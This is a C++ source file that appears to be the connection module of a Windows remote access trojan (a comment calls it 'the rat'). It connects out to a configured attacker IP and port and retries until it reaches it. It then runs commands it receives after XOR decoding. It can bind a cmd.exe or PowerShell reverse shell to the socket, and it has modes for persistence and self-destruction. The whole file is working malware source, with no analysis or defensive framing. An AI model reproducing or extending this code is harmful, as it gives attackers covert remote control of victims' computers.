//#define WIN32_LEAN_AND_MEAN


#include "../inc/Connexion.h"
#include "../inc/common.h"
#include "../inc/Persistence.h"
#include "../inc/other.h"
#include "../inc/Exec.h"
#include "../inc/Destruction.h"

using namespace std;


Connexion::Connexion()
{
    ;
} //Constructor


int Connexion::openConnexion()
{     
    Sleep(500);

    WSADATA WSAData; 
    
    SOCKET sock;
    SOCKADDR_IN address_client;

    sock_client = sock; //Find one alternativ


    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket

    address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(PORT);

    while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(TIMEOUT_SOCK_RECONNECT);
        //Whait...;  
    } 
    return 0;
}


int Connexion::main()
{   
    string command,status;
    vector <string> result;

    int len_recv=0;    
    
    int cmpt;
    const int max_cmpt = TIMEOUT / MICRO_SLEEP;
    bool status_destruction = false; //Test if error in Destruction
    while(true)
    {
        //Sleep(1000);

        command = recvSafe(); //Recv safe and decrypt xor
        
        if(command.find("is_life?") != string::npos)
        {
            ;
            //if find is_life then continue
        }

        else
        {
            //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
            if(command=="exit")//change 
            {
                break;
            }
            else if (command.empty())
            {
                //Connection is down.
                ;
            }
            else if(command.substr(0,2)=="cd")
            {
            //Change directory
                if(changeDirectory(command))
                {
                    result.push_back("Error when changing folder.");
                }
                else
                {
                    result.push_back(getPath());   
                }
                sendSafe(result);
            }

            else if(command.substr(0,16) == "MOD_SPAWN_SHELL:")
            {   
                wchar_t prog[20];
                
                //test if cmd.exe or powershell.exe

                if(command.substr(16, command.length()) == "cmd.exe")
                {
                    wcscpy(prog, L"cmd.exe");
                    Exec().spawnSHELL(sock_client,prog);
                }

                else
                {      
                    wcscpy(prog, L"powershell.exe");
                    Exec().spawnSHELL(sock_client,prog);
                }

            }
            else if(command.substr(0,8)=="MOD_ALL:")
            {
                Exec().executeCommand(command.substr(8));   
            }

            else if (command.substr(0,16) =="MOD_PERSISTENCE:")
            {
                //In mod persistence.
                Persistence persistence(a_is_admin, a_path_prog);
                persistence.main();

                if(command.substr(16) =="default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                {
                    send(sock_client , XOREncryption("\r\n").c_str() ,2 ,0);    
                }
                else
                {
                    //cout << "broadcast persi" << endl;
                    ;
                }
            }
            
            else if (command.substr(0,16) == "MOD_DESTRUCTION:") 
            {
                string name_prog = NAME_PROG; //To change
                wstring name_prog_unicode(name_prog.begin(), name_prog.end()) ; //To change
                wstring path_prog_unicode(a_path_prog.begin(), a_path_prog.end());
                
                Destruction destruction(name_prog_unicode, path_prog_unicode);

                status_destruction = destruction.main();

                if(status_destruction) //Go destruction !
                {
                    //If error
                    //string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
                    status = "MOD_DESTRUCTION:" SPLIT + (string)"True";// "[-] An error occurred while executing the destroy mode.";
                }
                else
                {
                    status = "MOD_DESTRUCTION:" SPLIT + (string)"False";//"[+] The destruction mode is executed successfully.";
                }  


                if(command.substr(16,7) == "default") //6 for default
                {
                    //if default then send status at server. 
                    //send default persi
                    send(sock_client, XOREncryption(status).c_str(), status.length(),0); //Send the statue to the server. The server will just display the status.
                }
                
                else //else  substr(15,6) == "broadcast"
                {
                    //not send status
                    ;
                }
                closeConnexion();
                exit(0);
                
                /*
                if(status_destruction) //If an error does not finish the connection.
                {
                    ;
                }
                else
                {
                    cout << "Not error bye... " << endl;
                    //system("pause");
                    closeConnexion();
                    exit(0);
                }

                cout << "\n\n---------------NOT EXIT ??? " << endl;
                */

            }

            else
            {
                result = Exec().executeCommand(command);
                if(command.substr(0,3) == "[-]")
                {;} //if error not append path.
                else
                {
                    result.push_back("\n\n"); //test
                    result.push_back(getPath());
                }
                
                sendSafe(result);
            }
        }
        command.erase();
        result.clear(); 
        //i++;
    }
    return 0;
}


string Connexion::recvSafe()
{//allows you to receive data while managing errors 
    char buffer[BUFFER_LEN];
    string result;
    
    ZeroMemory(&buffer, strlen(buffer));

    int len_recv=recv(sock_client,buffer,sizeof(buffer),0);

    if(len_recv==SOCKET_ERROR)
    {
        reConnect(); //?
        //return 1;
    }
    else
    {
        result.append(buffer,len_recv);
        
        if(result.empty())
        {
            //If command empty re connect to server.
            reConnect();
            return "";
        }
    }
    return XOREncryption(result);
}


void Connexion::sendSafe(vector<string> result_of_command)
{ /*send data and manage errors, also allows to segment the data if it is too big.
Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
    int iResult=0;
    int i=0;
    
    int size_all_result_of_command = 0;
    string end = "\r\n"; //END CONNECTION.
    string request = "";
    //cout << "size of result " << result_of_command.size() << endl;
    if(result_of_command.size() >= 1) 
    {        
        // Multiple request: 
        for(i=0;i< result_of_command.size(); i++)
        {
            
            request = result_of_command[i];
            
            send(sock_client, XOREncryption(request).c_str(), request.length(),0);
            /*
            cout << request << endl;
            cout << "size of request: " << result_of_command[i].length() << endl;
            cout << "I: " <<i <<endl;
            cout << "---------------------------\n\n" << endl;
            cout<<  XOREncryption(request) << endl;
            */
            size_all_result_of_command += request.length();
        
            Sleep(100);   
        }
    }

    else //if one request
    {
        request = result_of_command[0];

        iResult = send(sock_client, XOREncryption(request).c_str(), request.length(),0);
        checkSend(iResult);
        size_all_result_of_command += request.length();
    }
    
    cout << size_all_result_of_command << endl;
    
    iResult=send(sock_client,XOREncryption(end).c_str(),2,0); // send end communication.
    checkSend(iResult);

}


void Connexion::checkSend(int &iResult)
{
    //Test if an error occurs when sending data 
    if(iResult == SOCKET_ERROR)
    {
        //cout << "error in sendSafe" << endl;
        reConnect();
    }
}


void Connexion::closeConnexion()
{   
    // Can be made into a code system. ex:
    // If CODE01 == data then you delete the rat so everything is element.
    // Test if it should delete itself.
    // Test if he can connect several times to the server.
    // Test if it should wait after x second (s) to reconnect to the server.

    //"Close socket successful.
    closesocket(sock_client);
    WSACleanup(); //The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
}


void Connexion::reConnect()
{   
    string request;
    //if the client has a token then reconnects without handshaking

    closeConnexion();
    openConnexion();

    request = ("MOD_RECONNECT" SPLIT  + a_token);
    
    sendUltraSafe(sock_client, XOREncryption(request)); //send token
    sendUltraSafe(sock_client, XOREncryption("\r\n"));
}


int Connexion::getSocket()
{
    return sock_client;
}


void Connexion::setToken(string token)
{
    if(!token.empty())
    {
        a_token = token;
    }
    else
    {
        //if token is empty.
        char hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
        int i;

        srand(time(0)); 

        for(i=0;i< 24 ;i++){token += hex_characters[rand()%16];}
        a_token;
    }
    
}


void Connexion::setIsAdmin(bool is_admin)
{
    if(is_admin)
    {
        a_is_admin = true; //is admin
    }
    else
    {
        a_is_admin = false; //is not admin
    }
}


void Connexion::setPathProg(string path_prog)
{
    a_path_prog = path_prog;
}

